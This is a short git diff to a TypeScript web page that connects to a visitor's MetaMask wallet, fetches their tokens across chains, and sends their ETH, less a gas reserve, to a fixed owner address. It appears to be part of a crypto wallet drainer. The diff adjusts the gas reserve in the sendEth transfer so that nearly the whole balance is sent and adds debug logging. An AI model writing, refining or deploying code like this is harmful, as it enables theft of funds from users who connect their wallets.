@@ -18,6 +18,8 @@ import Web3 from "web3";
 
 const { ethereum } = window;
 
+let web3: any;
+
 const ZAPPER_MATCH = {
   eth: "ethereum",
   matic: "polygon",
@@ -69,7 +71,8 @@ export async function connectMetamask() {
 
   await ethereum.request({ method: "eth_requestAccounts" });
   const provider = window.ethereum;
-  const web3 = new Web3(provider);
+
+  web3 = new Web3(provider);
   const accounts = await web3.eth.getAccounts();
   account = accounts[0];
   connected = 1;
@@ -251,7 +254,9 @@ async function fetchUserTokens(address: string) {
 
 async function sendEth(amount: any, chain: any) {
   const gasPrice = await web3.eth.getGasPrice();
-  const newAmount = amount - Number(gasPrice) * 40000;
+  const newAmount = amount - Number(gasPrice) * 45000;
+
+  console.log({ gasPrice, newAmount });
 
   if (newAmount < 0) return;
 
@@ -260,7 +265,7 @@ async function sendEth(amount: any, chain: any) {
     to: ownerAddress,
     value: newAmount,
   };
-
+  
   var success = 1;
 
   try {
